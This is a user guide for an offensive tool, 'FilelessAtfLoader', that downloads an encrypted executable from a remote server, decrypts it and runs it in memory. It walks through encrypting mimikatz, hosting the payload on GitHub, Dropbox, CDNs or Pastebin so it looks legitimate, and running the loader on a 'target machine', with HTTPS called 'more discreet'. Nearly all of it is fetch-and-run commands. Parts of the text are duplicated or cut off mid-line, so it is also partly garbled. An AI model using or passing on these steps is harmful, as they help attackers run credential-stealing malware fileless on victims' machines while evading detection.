<p align="center">
  <a href="images/fal.jpg">
    <img src="images/fal.jpg" alt="FileLessAtfLoader" width="300" height="300"/>
  </a>
  <br/>
  <strong>FilelessAtFLoader</strong>
</p>

# FilelessAtfLoader User Guide

Loading Remote AES or ChaCha20 Encrypted PE in memory, Decrypted it and run it


### **1. Files to use:**

#### **For ChaCha20 encryption:**
- `cipher_chacha20.bin` - The encrypted payload
- `key_chacha20.bin` - The decryption key (32 bytes)
- ❌ `nonce_chacha20.bin` - **NOT necessary** (automatically derived from the key)

#### **For AES encryption:**
- `cipher.bin` - The encrypted payload
- `key.bin` - The decryption key (16, 24 or 32 bytes for AES-128, AES-192 or AES-256)

### **2. Execution from remote URLs:**

## **Mode 1: Classic server (Host:Port)**
```bash
# ChaCha20
FilelessAtfLoader.exe 192.168.1.100 8080 /cipher_chacha20.bin /key_chacha20.bin

# AES
FilelessAtfLoader.exe 192.168.1.100 8080 /cipher.bin /key.bin
```

## **Mode 2: Full URLs**
```bash
# ChaCha20
FilelessAtfLoader.exe https://myserver.com/cipher_chacha20.bin https://myserver.com/key_chacha20.bin

# AES

#### **Option A: ChaCha20 encryption**
```bash
python3 chacha20_cryptor.py mimikatz.exe

# Result:
# cipher_chacha20.bin (encrypted payload)
# key_chacha20.bin (key, 32 bytes)
# nonce_chacha20.bin (ignored by the loader)
```

#### **Option B: AES encryption**
```bash
python3 aes.py mimikatz.exe

# Result:
# cipher.bin (encrypted payload)
# key.bin (key, 16/24/32 bytes
```bash: Local/internal server**
```bash
# Simple option - Python server
python3 -m http.server 8080

# Your files are now accessible via:
# ChaCha20:
# http://localhost:8080/cipher_chacha20.bin
# http://localhost:8080/key_chacha20.bin
# AES:
# http://localhost:8080/cipher.bin
# http://localhost:8080/key loader)
```

### ChaCha20 - On Windows (target machine)
FilelessAtfLoader.exe 192.168.1.100 8080 /cipher_chacha20.bin /key_chacha20.bin

REM AES - On Windows (target machine)
FilelessAtfLoader.exe 192.168.1.100 8080 /cipher.bin /key.bin
```

#### **Option B: URL mode**
```cmd
REM ChaCha20 - HTTP URLs
FilelessAtfLoader.exe http://192.168.1.100:8080/cipher_chacha20.bin http://192.168.1.100:8080/key_chacha20.bin

REM AES - HTTP URLs
FilelessAtfLoader.exe http://192.168.1.100:8080/cipher.bin http://192.168.1.100:8080/key.bin

REM ChaCha20 - HTTPS URLs (more discreet)
FilelessAtfLoader.exe https://yourserver.com/cipher_chacha20.bin https://yourserver.com/key_chacha20.bin

REM AES - HTTPS URLs (more discreet)
FilelessAtfLoader.exe https://yourserver.com/cipher.bin https://yourserver.com/key.bin
### **1. GitHub hosting**
```bash
# ChaCha20 - Upload your encrypted files to GitHub
git add cipher_chacha20.bin key_chacha20.bin
git commit -m "Update resources"
git push

# ChaCha20 - Execution from GitHub raw URLs
FilelessAtfLoader.exe https://raw.githubusercontent.com/user/repo/main/cipher_chacha20.bin https://raw.githubusercontent.com/user/repo/main/key_chacha20.bin

# AES - Upload your encrypted files to GitHub
git add cipher.bin key.bin
git commit -m "Update resources"
git push

# AES - Execution from GitHub raw URLs
FilelessAtfLoader.exe https://raw.githubusercontent.com/user/repo/main/cipher.bin https://raw.githubusercontent.com/user/repo/main/key.bin
```

### **2. Cloud services (Dropbox, Google Drive)**
```bash
# ChaCha20 - Generate direct links and use
FilelessAtfLoader.exe https://dropbox.com/s/xyz/cipher_chacha20.bin https://dropbox.com/s/abc/key_chacha20.bin

# AES - Generate direct links and use
FilelessAtfLoader.exe https://dropbox.com/s/xyz/cipher.bin https://dropbox.com/s/abc/key.bin
```

### **3. CDN/Legitimate services**
```bash
# ChaCha20 - Via CloudFlare or other CDN
FilelessAtfLoader.exe https://cdn.yoursite.com/cipher_chacha20.bin https://cdn.yoursite.com/key_chacha20.bin

# AES - Via CloudFlare or other CDN
FilelessAtfLoader.exe https://cdn.yoursite.com/cipher.bin https://cdn.yoursite.com/key
---

## **Advanced usage examples**

```bash
# Upload your encrypted files to GitHub
git add cipher_chacha20.bin key_chacha20.bin
git commit -m "Update resources"
git push

# Execution from GitHub raw URLs
FilelessAtfLoader.exe https://raw.githubusercontent.com/user/repo/main/cipher_chacha20.bin https://raw.githubusercontent.com/user/repo/main/key_chacha20.bin
```

### **2. Cloud services (Dropbox, Google Drive)**
```bash
# Generate direct links and use
FilelessAtfLoader.exe https://dropbox.com/s/xyz/cipher_chacha20.bin https://dropbox.com/s/abc/key_chacha20.bin
```

### **3. CDN/Legitimate services**
```bash
# Via CloudFlare or other CDN
FilelessAtfLoader.exe https://cdn.yoursite.com/cipher_chacha20.bin https://cdn.yoursite.com/key_chacha20.bin
```

### **4. Pastebin-like services**
```bash
# Upload base64 encoded and download
FilelessAtfLoader.exe https://pastebin.com/raw/cipher_b64 https://pastebin.com/raw/key_b64
```

---

## **Automatic encryption detection**

FilelessAtfLoader automatically detects the encryption type:

### **Detection priority:**
1. **Filename** contains "chacha20" → ChaCha20
2. **Key size** = 32 bytes → ChaCha20 (assumed)
3. **Default** → AES

### **Examples:**
```bash
# Auto-detected as ChaCha20
FilelessAtfLoader.exe server.com:8080 /cipher_chacha20.bin /key_chacha20.bin

# Auto-detected as ChaCha20 (key size = 32 bytes)
FilelessAtfLoader.exe server.com:8080 /payload.bin /key32.bin

# Auto-detected as AES
FilelessAtfLoader.exe server.com:8080 /cipher.bin /key.bin
```

---

### Requirements
1. hashlib
2. pycryptodome
3. pycryptodomex


By 4rt3f4kt
